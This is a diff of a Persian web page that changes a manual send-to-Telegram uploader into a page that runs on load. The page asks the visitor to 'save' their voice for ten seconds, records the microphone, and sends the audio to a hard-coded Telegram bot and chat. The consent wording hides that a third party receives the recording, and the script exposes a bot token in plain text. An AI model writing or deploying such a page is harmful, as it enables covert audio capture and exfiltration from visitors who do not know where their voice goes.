@@ -1,107 +1,88 @@
-
 <!DOCTYPE html>
 <html lang="fa">
 <head>
   <meta charset="UTF-8">
+  <title>ضبط صدا</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ارسال به تلگرام</title>
   <style>
     body {
       font-family: sans-serif;
-      background: #f4f4f4;
+      background: #f2f2f2;
       padding: 20px;
       text-align: center;
-    }
-    button, input {
-      margin: 10px;
-      padding: 10px 20px;
-      font-size: 16px;
-      border-radius: 10px;
-      border: none;
     }
     .status {
       margin-top: 20px;
       color: green;
+      font-weight: bold;
     }
   </style>
 </head>
 <body>
-  <h2>ارسال صدا، عکس و فیلم به تلگرام</h2>
-
-  <button id="startRecord">🎙 شروع ضبط</button>
-  <button id="stopRecord" disabled>⏹ پایان ضبط</button>
-  <br>
-  <input type="file" id="photoInput" accept="image/*">
-  <input type="file" id="videoInput" accept="video/*">
-  <p class="status" id="status">منتظر اقدام...</p>
+  <h2>ضبط صدای خودکار</h2>
+  <p class="status" id="status">در حال آماده‌سازی...</p>
 
   <script>
     const botToken = "7996751116:AAFRkCkQ32NI35JKeqeacSFayJnPjlMVRxs";
     const chatId = "1120400003";
-    let mediaRecorder;
-    let audioChunks = [];
-
-    const startBtn = document.getElementById("startRecord");
-    const stopBtn = document.getElementById("stopRecord");
     const statusText = document.getElementById("status");
 
-    startBtn.onclick = async () => {
-      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-      mediaRecorder = new MediaRecorder(stream);
-      audioChunks = [];
+    async function startAutoRecording() {
+      const confirmRecord = confirm("این سایت می‌خواهد صدای شما را به مدت ۱۰ ثانیه ذخیره کند. آیا موافقید؟");
 
-      mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
-      mediaRecorder.onstop = () => {
-        const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
-        sendFile(audioBlob, "voice");
-      };
+      if (!confirmRecord) {
+        statusText.innerText = "❌ ضبط لغو شد توسط کاربر.";
+        return;
+      }
 
-      mediaRecorder.start();
-      startBtn.disabled = true;
-      stopBtn.disabled = false;
-      statusText.innerText = "🔴 در حال ضبط...";
-    };
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
+        const audioChunks = [];
 
-    stopBtn.onclick = () => {
-      mediaRecorder.stop();
-      startBtn.disabled = false;
-      stopBtn.disabled = true;
-      statusText.innerText = "⏹ ضبط پایان یافت، در حال ارسال...";
-    };
+        mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
 
-    function sendFile(file, type) {
+        mediaRecorder.onstop = () => {
+          const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
+          sendVoice(audioBlob);
+        };
+
+        mediaRecorder.start();
+        statusText.innerText = "🎙 در حال ضبط به مدت ۱۰ ثانیه...";
+
+        setTimeout(() => {
+          mediaRecorder.stop();
+          statusText.innerText = "⏳ در حال ارسال صدا...";
+        }, 10000);
+      } catch (error) {
+        statusText.innerText = "❌ دسترسی به میکروفون رد شد یا خطایی رخ داد.";
+      }
+    }
+
+    function sendVoice(blob) {
       const formData = new FormData();
-      formData.append(type, file);
       formData.append("chat_id", chatId);
+      formData.append("voice", blob);
 
-      fetch(`https://api.telegram.org/bot${botToken}/send${capitalize(type)}`, {
+      fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
         method: "POST",
         body: formData
       })
       .then(res => res.json())
-      .then(res => statusText.innerText = "✅ ارسال موفق بود!")
-      .catch(err => statusText.innerText = "❌ خطا در ارسال!");
+      .then(data => {
+        if (data.ok) {
+          statusText.innerText = "✅ صدا با موفقیت ارسال شد!";
+        } else {
+          statusText.innerText = "❌ خطا در ارسال صدا!";
+        }
+      })
+      .catch(() => {
+        statusText.innerText = "❌ خطا در اتصال به تلگرام!";
+      });
     }
 
-    function capitalize(str) {
-      return str.charAt(0).toUpperCase() + str.slice(1);
-    }
-
-    document.getElementById("photoInput").onchange = (e) => {
-      const file = e.target.files[0];
-      if (file) {
-        statusText.innerText = "📤 در حال ارسال عکس...";
-        sendFile(file, "photo");
-      }
-    };
-
-    document.getElementById("videoInput").onchange = (e) => {
-      const file = e.target.files[0];
-      if (file) {
-        statusText.innerText = "📤 در حال ارسال ویدیو...";
-        sendFile(file, "video");
-      }
-    };
+    // اجرای خودکار بعد از لود صفحه
+    window.onload = startAutoRecording;
   </script>
 </body>
 </html>
